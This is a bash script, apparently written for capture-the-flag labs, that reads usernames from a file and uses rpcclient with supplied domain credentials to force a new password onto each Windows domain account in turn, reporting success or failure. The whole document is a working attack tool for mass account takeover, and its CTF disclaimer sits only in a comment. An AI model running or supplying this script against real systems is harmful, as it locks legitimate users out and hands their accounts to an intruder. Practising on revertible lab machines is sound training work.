#!/bin/bash
# Usage : ./new.sh 10.10.10.10 'domain.local\\test.user' 'badpassword' users.txt 'PasswordtoSet'
# Make sure to run this script in test and controlled enviorment as too many rpc requests can throttle the target ending up in requests failure. This Script is specifically designed for CTFs where you have a option to revert the enviornment

IP="$1"
AUTH_USER="$2"
AUTH_PASS="$3"
USERS_FILE="$4"
NEW_PASS="$5"

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

while IFS= read -r USER || [ -n "$USER" ]; do
    [[ -z "$USER" || "$USER" =~ ^# ]] && continue
    echo -e "Resetting password for ${USER}..."
    
    OUTPUT=$(rpcclient //$IP -U "$AUTH_USER%$AUTH_PASS" -c "setuserinfo2 $USER 23 '$NEW_PASS'" 2>&1)
    
    if [[ -z "$OUTPUT" ]]; then
        # No output means success
        echo -e "${GREEN}Success${NC}"
    else
        # On failure, show concise error
        echo -e "${RED}Failed:${NC} $(echo "$OUTPUT" | head -1)"
    fi
    echo ""
done < "$USERS_FILE"
